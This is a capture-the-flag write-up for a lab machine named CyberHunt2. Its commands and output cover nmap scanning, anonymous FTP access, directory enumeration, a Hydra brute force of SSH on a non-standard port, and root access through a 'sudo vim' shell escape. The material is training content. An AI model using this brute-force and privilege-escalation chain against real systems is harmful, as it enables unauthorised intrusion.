# **CyberHunt2 - ThunderCipher**

*Target Ip. Address: 192.168.5.87*

Let's start with a basic nmap scan.

```bash
kali@kali:nmap -sV -sC 192.168.5.87
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 20:20 +0545
Nmap scan report for 192.168.5.87
Host is up (0.080s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.5.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 1000     1000          108 Feb 06 11:47 readme
|_-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: CyberHunt2
| http-robots.txt: 1 disallowed entry 
|_*/
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
```

We have port 21 (ftp) and port (80). It seems ssh is not in default port. We will get back to it later.
Let's see what we have in port 21 as we have anonymous login allowed.

```bash
kali@kali:ftp 192.168.5.87
Connected to 192.168.5.87.
220 (vsFTPd 3.0.3)
Name (192.168.5.87:kali): anonymous
331 Please specify the password.
Password:                                                                                                                              
230 Login successful.                                                                                                                  
Remote system type is UNIX.                                                                                                            
Using binary mode to transfer files.                                                                                                   
ftp> ls                                                                                                                                
229 Entering Extended Passive Mode (|||26536|)                                                                                         
150 Here comes the directory listing.                                                                                                  
-rw-r--r--    1 1000     1000          108 Feb 06 11:47 readme                                                                         
-rw-r--r--    1 1000     1000          849 Jun 19  2021 word.dir                                                                       
226 Directory send OK.                                                                                                                 
ftp> get readme                                                                                                                        
local: readme remote: readme                                                                                                           
229 Entering Extended Passive Mode (|||12261|)                                                                                         
150 Opening BINARY mode data connection for readme (108 bytes).                                                                        
100% |****************************************************************************************************************|   108      426.99 KiB/s    00:00 ETA
226 Transfer complete.
108 bytes received in 00:00 (1.02 KiB/s)
ftp> get word.dir
local: word.dir remote: word.dir
229 Entering Extended Passive Mode (|||30465|)
150 Opening BINARY mode data connection for word.dir (849 bytes).
100% |****************************************************************************************************************|   849       91.39 KiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (9.44 KiB/s)
ftp>
```

So, we download 2 files from the ftp.

```bash
kali@kali:cat readme                                                                                                                                               
Files are not the only thing shared here.
Some doors open when passwords are reused.
Think beyond port 21.
```

So, the hint is think out of the box stuffs. We have a basic wordlists.

Let's begin with gobuster while using that wordlist.

```bash
kali@kali:gobuster dir -u http://192.168.5.87 -w word.dir
===============================================================                                                                                              
Gobuster v3.8.2                                                                                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                
===============================================================                                                                                              
[+] Url:                     http://192.168.5.87                                                                                                             
[+] Method:                  GET                                                                                                                             
[+] Threads:                 10                                                                                                                              
[+] Wordlist:                word.dir                                                                                                                        
[+] Negative Status codes:   404                                                                                                                             
[+] User Agent:              gobuster/3.8.2                                                                                                                  
[+] Timeout:                 10s                                                                                                                             
===============================================================                                                                                              
Starting gobuster in directory enumeration mode                                                                                                              
===============================================================
happy                (Status: 200) [Size: 108]
Progress: 109 / 109 (100.00%)
===============================================================
Finished
===============================================================
```

We have one hit. Let's see what happy has for us.

```html
<html>
<title>happy</title>

<body><h1> Nothing is in here</h1></body>

<!-- username: shadowops >

</html>
```

In the source code we find a username possibly for ssh. But we don't know ssh port, so let's do full port scan.

```bash
kali@kali:nmap -p- 192.168.5.87
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 20:27 +0545
Nmap scan report for 192.168.5.87
Host is up (0.087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
7223/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 299.02 seconds
```

So, we have 1 more port added, let's see if it is ssh.

```bash
kali@kali:nmap -sV -sC -p 7223 192.168.5.87
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 20:34 +0545
Nmap scan report for 192.168.5.87
Host is up (0.089s latency).

PORT     STATE SERVICE VERSION
7223/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 4e:db:a6:d2:eb:b9:53:a5:d7:21:0b:4e:57:a5:f5:c1 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

Yes, it was indeed ssh. We have username and a wordlists. Let's use hydra to see if we have password for the user in that wordlist.

```bash
kali@kali:hydra -l shadowops -P word.dir ssh://192.168.5.87 -s 7223
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-10 20:34:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 110 login tries (l:1/p:110), ~7 tries per task
[DATA] attacking ssh://192.168.5.87:7223/
[7223][ssh] host: 192.168.5.87   login: shadowops   password: T...O
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-10 20:34:47
```

We have a valid set of credentials for ssh. Let's login via ssh on port 7223.

```bash
kali@kali:ssh shadowops@192.168.5.87 -p 7223                                                                                                                       
The authenticity of host '[192.168.5.87]:7223 ([192.168.5.87]:7223)' can't be established.
ED25519 key fingerprint is: SHA256:kVyS5RqS8tFczs71LETg90vnsj/ZLDrqbn91uPP1Cik
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.5.87]:7223' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
shadowops@192.168.5.87's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 10 Feb 2026 02:50:32 PM UTC

  System load:  0.0                Processes:              123
  Usage of /:   24.0% of 18.57GB   Users logged in:        0
  Memory usage: 11%                IPv4 address for ens18: 192.168.5.87
  Swap usage:   0%


67 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '22.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Fri Feb  6 11:57:32 2026 from 192.168.5.126
shadowops@cyberhunt2:~$ 
```

We find the user flag at home direectory.

```bash
shadowops@cyberhunt2:~$ cat user.txt
ThunderCipher{ft.....17}
```

Let's see if we have sudo permissions.

```bash
shadowops@cyberhunt2:~$ sudo -l
Matching Defaults entries for shadowops on cyberhunt2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shadowops may run the following commands on cyberhunt2:
    (root) NOPASSWD: /usr/bin/vim
```

Great! We can use /usr/bin/vim to become root.


```bash
shadowops@cyberhunt2:~$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root. Let's end the challenge by reading the final flag at root directory.

```bash
# cat root.txt
ThunderCipher{mi.....do}
```
